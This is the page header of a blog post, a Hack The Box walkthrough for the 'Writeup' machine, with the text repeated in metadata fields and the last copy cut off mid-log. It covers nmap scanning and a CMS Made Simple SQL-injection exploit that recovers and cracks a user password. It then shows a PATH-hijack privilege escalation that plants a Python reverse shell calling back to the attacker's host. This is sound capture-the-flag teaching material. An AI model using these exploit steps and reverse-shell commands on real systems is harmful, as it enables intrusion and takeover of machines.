<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Writeup" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! 1 $ echo &quot;10.10.10.138 writeup.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 $ nmap -sS writeup.htb -p 1-65535 -T4 Nmap scan report for writeup.htb (10.10.10.138) Host is up (0.25s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 250.07 seconds Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, lets see if we can gather any information or exploit it ? Hmm DoS Protection… I guess we cannot simply brute force the directory and pages on this web server. Maybe lets check if they have a robots.txt ? Alright they do ! And they even have a small robot ascii art on it ! :) Seems like there is also a writeup directory so lets try accessing it. This looks like a blog containing writeups of different HTB machines ? No wonder the machine is called writeup… Exploitation Checking the source of the page, we find out that the website is using CMS Made Simple. Maybe we can find some exploits for it ? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 $ searchsploit CMS Made Simple ------------------------------------------------------------------------------ ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ------------------------------------------------------------------------------ ---------------------------------------- CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasp | exploits/php/remote/46627.rb CMS Made Simple 0.10 - &#39;Lang.php&#39; Remote File Inclusion | exploits/php/webapps/26217.html CMS Made Simple 0.10 - &#39;index.php&#39; Cross-Site Scripting | exploits/php/webapps/26298.txt CMS Made Simple 1.0.2 - &#39;SearchInput&#39; Cross-Site Scripting | exploits/php/webapps/29272.txt CMS Made Simple 1.0.5 - &#39;Stylesheet.php&#39; SQL Injection | exploits/php/webapps/29941.txt CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities | exploits/php/webapps/32668.txt CMS Made Simple 1.11.9 - Multiple Vulnerabilities | exploits/php/webapps/43889.txt CMS Made Simple 1.2 - Remote Code Execution | exploits/php/webapps/4442.txt CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection | exploits/php/webapps/4810.txt CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload | exploits/php/webapps/5600.php CMS Made Simple 1.4.1 - Local File Inclusion | exploits/php/webapps/7285.txt CMS Made Simple 1.6.2 - Local File Disclosure | exploits/php/webapps/9407.txt CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting | exploits/php/webapps/33643.txt CMS Made Simple 1.6.6 - Multiple Vulnerabilities | exploits/php/webapps/11424.txt CMS Made Simple 1.7 - Cross-Site Request Forgery | exploits/php/webapps/12009.html CMS Made Simple 1.8 - &#39;default_cms_lang&#39; Local File Inclusion | exploits/php/webapps/34299.py CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery | exploits/php/webapps/34068.html CMS Made Simple 2.1.6 - Multiple Vulnerabilities | exploits/php/webapps/41997.txt CMS Made Simple 2.1.6 - Remote Code Execution | exploits/php/webapps/44192.txt CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution | exploits/php/webapps/44976.py CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution | exploits/php/webapps/45793.py CMS Made Simple &lt; 1.12.1 / &lt; 2.1.3 - Web Server Cache Poisoning | exploits/php/webapps/39760.txt CMS Made Simple &lt; 2.2.10 - SQL Injection | exploits/php/webapps/46635.py CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload | exploits/php/webapps/34300.py CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload | exploits/php/webapps/34298.py CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Uploa | exploits/php/webapps/46546.py ------------------------------------------------------------------------------ ---------------------------------------- Shellcodes: No Result Papers: No Result Oh wow there are so many exploits! But which one do we use ? After some trial and error, the one that worked for me was CMS Made Simple &lt; 2.2.10 - SQL Injection. Using the --crack option and specifying rockyou.txt as the wordlist, 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ python /usr/share/exploitdb/exploits/php/webapps/46635.py -h Usage: 46635.py [options] Options: -h, --help show this help message and exit -u URL, --url=URL Base target uri (ex. http://10.10.10.100/cms) -w WORDLIST, --wordlist=WORDLIST Wordlist for crack admin password -c, --crack Crack password with wordlist $ python CVE-2019-9053.py -u http://writeup.htb/writeup --crack -w /usr/share/wordlists/rockyou.txt [+] Salt for password found: 5a599ef579066807 [+] Username found: jkr [+] Email found: jkr@writeup.htb [+] Password found: 62def4866937f08cc13bab43bb14e6f7 [+] Password cracked: raykayjay9 Neat ! We got the password for user jkr! user.txt If we try to access ssh into jkr’s account using the credentials we found, 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ ssh jkr@writeup.htb jkr@writeup.htb&#39;s password: Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux The programs included with the Devuan GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. jkr@writeup:~$ ls user.txt jkr@writeup:~$ cat user.txt d4e4XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration As jkr, we need to know what processes are being runned on the machine. To do so, I will be using pspy. To transfer it from my machine to this machine, I will be using python’s SimpleHTTPServer module. On my machine: 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/Downloads/pspy64 . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... On the Writeup machine: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 jkr@writeup:~$ cd /tmp jkr@writeup:/tmp$ wget http://10.10.XXX.XXX/pspy64 --2019-08-28 22:59:29-- http://10.10.XXX.XXX/pspy64 Connecting to 10.10.XXX.XXX:80... connected. HTTP request sent, awaiting response... 200 OK Length: 4468984 (4.3M) [application/octet-stream] Saving to: ‘pspy64’ pspy64 100%[==============================================&gt;] 4.26M 1006KB/s in 5.2s 2019-08-28 22:59:34 (842 KB/s) - ‘pspy64’ saved [4468984/4468984] jkr@writeup:/tmp$ chmod 777 pspy64 jkr@writeup:/tmp$ ./pspy64 After monitoring for a while, we see some commands being run as root, 1 2 3 2019/08/28 23:02:25 CMD: UID=0 PID=2313 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin: /usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 2019/08/28 23:02:25 CMD: UID=0 PID=2314 | run-parts --lsbsysinit /etc/update-motd.d For the first command, it is mainly setting the $PATH environment variable which determines where the system looks for executables. For the second command, it is running the run-parts command. When I checked where the run-parts executable was located, 1 2 jkr@writeup:/tmp$ which run-parts /bin/run-parts run-parts was found at /bin but /bin is not the first location that the system will look for executables. How can we take advantage of this fact ? If we create an executable called run-parts at /usr/local/sbin, the system will execute that instead of the run-parts at /bin! Privilege Escalation 1 2 3 4 jkr@writeup:/tmp$ echo &quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.con nect((\&quot;10.10.XXX.XXX\&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;&quot; &gt; /usr/local/sbin/run-parts jkr@writeup:/tmp$ chmod 777 /usr/local/sbin/run-parts For the executable, it is a script that contains the command that establishes a reverse shell back to our listener. 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... After a long while, I realised that I was not catching any connections from the Writeup machine. Is the run-parts not getting run ? Lets run pspy again to find out why! 1 2 3 4 5 6 7 8 9 10 11 12 13 2019/08/28 23:52:51 CMD: UID=0 PID=26053 | sshd: [accepted] 2019/08/28 23:52:51 CMD: UID=0 PID=26054 | sshd: [accepted] 2019/08/28 23:52:55 CMD: UID=0 PID=26055 | sshd: jkr [priv] 2019/08/28 23:52:55 CMD: UID=0 PID=26056 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin: /usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 2019/08/28 23:52:55 CMD: UID=0 PID=26057 | run-parts --lsbsysinit /etc/update-motd.d ... 2019/08/28 23:54:27 CMD: UID=0 PID=26076 | sshd: [accepted] 2019/08/28 23:54:27 CMD: UID=0 PID=26077 | sshd: [accepted] 2019/08/28 23:54:31 CMD: UID=0 PID=26078 | sshd: jkr [priv] 2019/08/28 23:54:31 CMD: UID=0 PID=26079 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin: /usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 2019/08/28 23:54:31 CMD: UID=0 PID=26080 | run-parts --lsbsysinit /etc/update-motd.d By some chance, I noticed that the 2 commands were being run every time someone has logged in via ssh! So lets try this again… root.txt On my machine (listener): 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... On the Writeup machine: 1 2 3 4 jkr@writeup:/tmp$ echo &quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.con nect((\&quot;10.10.XXX.XXX\&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;&quot; &gt; /usr/local/sbin/run-parts jkr@writeup:/tmp$ chmod 777 /usr/local/sbin/run-parts Again on my machine (on another terminal): 1 2 3 $ ssh jkr@writeup.htb jkr@writeup.htb&#39;s password: Again on my machine (listener): 1 2 3 4 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.138] 59722 /bin/sh: 0: can&#39;t access tty; job control turned off # id uid=0(root) gid=0(root) groups=0(root) We are in! 1 2 3 4 5 6 # cd /root # ls bin root.txt # cat root.txt eebaXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><meta property="og:description" content="Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! 1 $ echo &quot;10.10.10.138 writeup.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 $ nmap -sS writeup.htb -p 1-65535 -T4 Nmap scan report for writeup.htb (10.10.10.138) Host is up (0.25s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 250.07 seconds Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, lets see if we can gather any information or exploit it ? Hmm DoS Protection… I guess we cannot simply brute force the directory and pages on this web server. Maybe lets check if they have a robots.txt ? Alright they do ! And they even have a small robot ascii art on it ! :) Seems like there is also a writeup directory so lets try accessing it. This looks like a blog containing writeups of different HTB machines ? No wonder the machine is called writeup… Exploitation Checking the source of the page, we find out that the website is using CMS Made Simple. Maybe we can find some exploits for it ? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 $ searchsploit CMS Made Simple ------------------------------------------------------------------------------ ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ------------------------------------------------------------------------------ ---------------------------------------- CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasp | exploits/php/remote/46627.rb CMS Made Simple 0.10 - &#39;Lang.php&#39; Remote File Inclusion | exploits/php/webapps/26217.html CMS Made Simple 0.10 - &#39;index.php&#39; Cross-Site Scripting | exploits/php/webapps/26298.txt CMS Made Simple 1.0.2 - &#39;SearchInput&#39; Cross-Site Scripting | exploits/php/webapps/29272.txt CMS Made Simple 1.0.5 - &#39;Stylesheet.php&#39; SQL Injection | exploits/php/webapps/29941.txt CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities | exploits/php/webapps/32668.txt CMS Made Simple 1.11.9 - Multiple Vulnerabilities | exploits/php/webapps/43889.txt CMS Made Simple 1.2 - Remote Code Execution | exploits/php/webapps/4442.txt CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection | exploits/php/webapps/4810.txt CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload | exploits/php/webapps/5600.php CMS Made Simple 1.4.1 - Local File Inclusion | exploits/php/webapps/7285.txt CMS Made Simple 1.6.2 - Local File Disclosure | exploits/php/webapps/9407.txt CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting | exploits/php/webapps/33643.txt CMS Made Simple 1.6.6 - Multiple Vulnerabilities | exploits/php/webapps/11424.txt CMS Made Simple 1.7 - Cross-Site Request Forgery | exploits/php/webapps/12009.html CMS Made Simple 1.8 - &#39;default_cms_lang&#39; Local File Inclusion | exploits/php/webapps/34299.py CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery | exploits/php/webapps/34068.html CMS Made Simple 2.1.6 - Multiple Vulnerabilities | exploits/php/webapps/41997.txt CMS Made Simple 2.1.6 - Remote Code Execution | exploits/php/webapps/44192.txt CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution | exploits/php/webapps/44976.py CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution | exploits/php/webapps/45793.py CMS Made Simple &lt; 1.12.1 / &lt; 2.1.3 - Web Server Cache Poisoning | exploits/php/webapps/39760.txt CMS Made Simple &lt; 2.2.10 - SQL Injection | exploits/php/webapps/46635.py CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload | exploits/php/webapps/34300.py CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload | exploits/php/webapps/34298.py CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Uploa | exploits/php/webapps/46546.py ------------------------------------------------------------------------------ ---------------------------------------- Shellcodes: No Result Papers: No Result Oh wow there are so many exploits! But which one do we use ? After some trial and error, the one that worked for me was CMS Made Simple &lt; 2.2.10 - SQL Injection. Using the --crack option and specifying rockyou.txt as the wordlist, 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ python /usr/share/exploitdb/exploits/php/webapps/46635.py -h Usage: 46635.py [options] Options: -h, --help show this help message and exit -u URL, --url=URL Base target uri (ex. http://10.10.10.100/cms) -w WORDLIST, --wordlist=WORDLIST Wordlist for crack admin password -c, --crack Crack password with wordlist $ python CVE-2019-9053.py -u http://writeup.htb/writeup --crack -w /usr/share/wordlists/rockyou.txt [+] Salt for password found: 5a599ef579066807 [+] Username found: jkr [+] Email found: jkr@writeup.htb [+] Password found: 62def4866937f08cc13bab43bb14e6f7 [+] Password cracked: raykayjay9 Neat ! We got the password for user jkr! user.txt If we try to access ssh into jkr’s account using the credentials we found, 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ ssh jkr@writeup.htb jkr@writeup.htb&#39;s password: Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux The programs included with the Devuan GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. jkr@writeup:~$ ls user.txt jkr@writeup:~$ cat user.txt d4e4XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration As jkr, we need to know what processes are being runned on the machine. To do so, I will be using pspy. To transfer it from my machine to this machine, I will be using python’s SimpleHTTPServer module. On my machine: 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/Downloads/pspy64 . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... On the Writeup machine: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 jkr@writeup:~$ cd /tmp jkr@writeup:/tmp$ wget http://10.10.XXX.XXX/pspy64 --2019-08-28 22:59:29-- http://10.10.XXX.XXX/pspy64 Connecting to 10.10.XXX.XXX:80... connected. HTTP request sent, awaiting response... 200 OK Length: 4468984 (4.3M) [application/octet-stream] Saving to: ‘pspy64’ pspy64 100%[==============================================&gt;] 4.26M 1006KB/s in 5.2s 2019-08-28 22:59:34 (842 KB/s) - ‘pspy64’ saved [4468984/4468984] jkr@writeup:/tmp$ chmod 777 pspy64 jkr@writeup:/tmp$ ./pspy64 After monitoring for a while, we see some commands being run as root, 1 2 3 2019/08/28 23:02:25 CMD: UID=0 PID=2313 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin: /usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 2019/08/28 23:02:25 CMD: UID=0 PID=2314 | run-parts --lsbsysinit /etc/update-motd.d For the first command, it is mainly setting the $PATH environment variable which determines where the system looks for executables. For the second command, it is running the run-parts command. When I checked where the run-parts executable was located, 1 2 jkr@writeup:/tmp$ which run-parts /bin/run-parts run-parts was found at /bin but /bin is not the first location that the system will look for executables. How can we take advantage of this fact ? If we create an executable called run-parts at /usr/local/sbin, the system will execute that instead of the run-parts at /bin! Privilege Escalation 1 2 3 4 jkr@writeup:/tmp$ echo &quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.con nect((\&quot;10.10.XXX.XXX\&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;&quot; &gt; /usr/local/sbin/run-parts jkr@writeup:/tmp$ chmod 777 /usr/local/sbin/run-parts For the executable, it is a script that contains the command that establishes a reverse shell back to our listener. 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... After a long while, I realised that I was not catching any connections from the Writeup machine. Is the run-parts not getting run ? Lets run pspy again to find out why! 1 2 3 4 5 6 7 8 9 10 11 12 13 2019/08/28 23:52:51 CMD: UID=0 PID=26053 | sshd: [accepted] 2019/08/28 23:52:51 CMD: UID=0 PID=26054 | sshd: [accepted] 2019/08/28 23:52:55 CMD: UID=0 PID=26055 | sshd: jkr [priv] 2019/08/28 23:52:55 CMD: UID=0 PID=26056 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin: /usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 2019/08/28 23:52:55 CMD: UID=0 PID=26057 | run-parts --lsbsysinit /etc/update-motd.d ... 2019/08/28 23:54:27 CMD: UID=0 PID=26076 | sshd: [accepted] 2019/08/28 23:54:27 CMD: UID=0 PID=26077 | sshd: [accepted] 2019/08/28 23:54:31 CMD: UID=0 PID=26078 | sshd: jkr [priv] 2019/08/28 23:54:31 CMD: UID=0 PID=26079 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin: /usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 2019/08/28 23:54:31 CMD: UID=0 PID=26080 | run-parts --lsbsysinit /etc/update-motd.d By some chance, I noticed that the 2 commands were being run every time someone has logged in via ssh! So lets try this again… root.txt On my machine (listener): 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... On the Writeup machine: 1 2 3 4 jkr@writeup:/tmp$ echo &quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.con nect((\&quot;10.10.XXX.XXX\&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;&quot; &gt; /usr/local/sbin/run-parts jkr@writeup:/tmp$ chmod 777 /usr/local/sbin/run-parts Again on my machine (on another terminal): 1 2 3 $ ssh jkr@writeup.htb jkr@writeup.htb&#39;s password: Again on my machine (listener): 1 2 3 4 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.138] 59722 /bin/sh: 0: can&#39;t access tty; job control turned off # id uid=0(root) gid=0(root) groups=0(root) We are in! 1 2 3 4 5 6 # cd /root # ls bin root.txt # cat root.txt eebaXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><link rel="canonical" href="https://rizemon.github.io/posts/writeup-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/writeup-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-10-13T15:35:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Writeup" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/writeup-htb/"},"description":"Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! 1 $ echo &quot;10.10.10.138 writeup.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 $ nmap -sS writeup.htb -p 1-65535 -T4 Nmap scan report for writeup.htb (10.10.10.138) Host is up (0.25s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 250.07 seconds Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, lets see if we can gather any information or exploit it ? Hmm DoS Protection… I guess we cannot simply brute force the directory and pages on this web server. Maybe lets check if they have a robots.txt ? Alright they do ! And they even have a small robot ascii art on it ! :) Seems like there is also a writeup directory so lets try accessing it. This looks like a blog containing writeups of different HTB machines ? No wonder the machine is called writeup… Exploitation Checking the source of the page, we find out that the website is using CMS Made Simple. Maybe we can find some exploits for it ? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 $ searchsploit CMS Made Simple ------------------------------------------------------------------------------ ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ------------------------------------------------------------------------------ ---------------------------------------- CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasp | exploits/php/remote/46627.rb CMS Made Simple 0.10 - &#39;Lang.php&#39; Remote File Inclusion | exploits/php/webapps/26217.html CMS Made Simple 0.10 - &#39;index.php&#39; Cross-Site Scripting | exploits/php/webapps/26298.txt CMS Made Simple 1.0.2 - &#39;SearchInput&#39; Cross-Site Scripting | exploits/php/webapps/29272.txt CMS Made Simple 1.0.5 - &#39;Stylesheet.php&#39; SQL Injection | exploits/php/webapps/29941.txt CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities | exploits/php/webapps/32668.txt CMS Made Simple 1.11.9 - Multiple Vulnerabilities | exploits/php/webapps/43889.txt CMS Made Simple 1.2 - Remote Code Execution | exploits/php/webapps/4442.txt CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection | exploits/php/webapps/4810.txt CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload | exploits/php/webapps/5600.php CMS Made Simple 1.4.1 - Local File Inclusion | exploits/php/webapps/7285.txt CMS Made Simple 1.6.2 - Local File Disclosure | exploits/php/webapps/9407.txt CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting | exploits/php/webapps/33643.txt CMS Made Simple 1.6.6 - Multiple Vulnerabilities | exploits/php/webapps/11424.txt CMS Made Simple 1.7 - Cross-Site Request Forgery | exploits/php/webapps/12009.html CMS Made Simple 1.8 - &#39;default_cms_lang&#39; Local File Inclusion | exploits/php/webapps/34299.py CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery | exploits/php/webapps/34068.html CMS Made Simple 2.1.6 - Multiple Vulnerabilities | exploits/php/webapps/41997.txt CMS Made Simple 2.1.6 - Remote Code Execution | exploits/php/webapps/44192.txt CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution | exploits/php/webapps/44976.py CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution | exploits/php/webapps/45793.py CMS Made Simple &lt; 1.12.1 / &lt; 2.1.3 - Web Server Cache Poisoning | exploits/php/webapps/39760.txt CMS Made Simple &lt; 2.2.10 - SQL Injection | exploits/php/webapps/46635.py CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload | exploits/php/webapps/34300.py CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload | exploits/php/webapps/34298.py CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Uploa | exploits/php/webapps/46546.py ------------------------------------------------------------------------------ ---------------------------------------- Shellcodes: No Result Papers: No Result Oh wow there are so many exploits! But which one do we use ? After some trial and error, the one that worked for me was CMS Made Simple &lt; 2.2.10 - SQL Injection. Using the --crack option and specifying rockyou.txt as the wordlist, 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ python /usr/share/exploitdb/exploits/php/webapps/46635.py -h Usage: 46635.py [options] Options: -h, --help show this help message and exit -u URL, --url=URL Base target uri (ex. http://10.10.10.100/cms) -w WORDLIST, --wordlist=WORDLIST Wordlist for crack admin password -c, --crack Crack password with wordlist $ python CVE-2019-9053.py -u http://writeup.htb/writeup --crack -w /usr/share/wordlists/rockyou.txt [+] Salt for password found: 5a599ef579066807 [+] Username found: jkr [+] Email found: jkr@writeup.htb [+] Password found: 62def4866937f08cc13bab43bb14e6f7 [+] Password cracked: raykayjay9 Neat ! We got the password for user jkr! user.txt If we try to access ssh into jkr’s account using the credentials we found, 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ ssh jkr@writeup.htb jkr@writeup.htb&#39;s password: Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux The programs included with the Devuan GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. jkr@writeup:~$ ls user.txt jkr@writeup:~$ cat user.txt d4e4XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration As jkr, we need to know what processes are being runned on the machine. To do so, I will be using pspy. To transfer it from my machine to this machine, I will be using python’s SimpleHTTPServer module. On my machine: 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/Downloads/pspy64 . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... On the Writeup machine: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 jkr@writeup:~$ cd /tmp jkr@writeup:/tmp$ wget http://10.10.XXX.XXX/pspy64 --2019-08-28 22:59:29-- http://10.10.XXX.XXX/pspy64 Connecting to 10.10.XXX.XXX:80... connected. HTTP request sent, awaiting response... 200 OK Length: 4468984 (4.3M) [application/octet-stream] Saving to: ‘pspy64’ pspy64 100%[==============================================&gt;] 4.26M 1006KB/s in 5.2s 2019-08-28 22:59:34 (842 KB/s) - ‘pspy64’ saved [4468984/4468984] jkr@writeup:/tmp$ chmod 777 pspy64 jkr@writeup:/tmp$ ./pspy64 After monitoring for a while, we see some commands being run as root, 1 2 3 2019/08/28 23:02:25 CMD: UID=0 PID=2313 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin: /usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 2019/08/28 23:02:25 CMD: UID=0 PID=2314 | run-parts --lsbsysinit /etc/update-motd.d For the first command, it is mainly setting the $PATH environment variable which determines where the system looks for executables. For the second command, it is running the run-parts command. When I checked where the run-parts executable was located, 1 2 jkr@writeup:/tmp$ which run-parts /bin/run-parts run-parts was found at /bin but /bin is not the first location that the system will look for executables. How can we take advantage of this fact ? If we create an executable called run-parts at /usr/local/sbin, the system will execute that instead of the run-parts at /bin! Privilege Escalation 1 2 3 4 jkr@writeup:/tmp$ echo &quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.con nect((\\&quot;10.10.XXX.XXX\\&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);&#39;&quot; &gt; /usr/local/sbin/run-parts jkr@writeup:/tmp$ chmod 777 /usr/local/sbin/run-parts For the executable, it is a script that contains the command that establishes a reverse shell back to our listener. 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... After a long while, I realised that I was not catching any connections from the Writeup machine. Is the run-parts not getting run ? Lets run pspy again to find out why! 1 2 3 4 5 6 7 8 9 10 11 12 13 2019/08/28 23:52:51 CMD: UID=0 PID=26053 | sshd: [accepted] 2019/08/28 23:52:51 CMD: UID=0 PID=26054 | sshd: [accepted] 2019/08/28 23:52:55 CMD: UID=0 PID=26055 | sshd: jkr [priv] 2019/08/28 23:52:55 CMD: UID=0 PID=26056 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin: /usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d 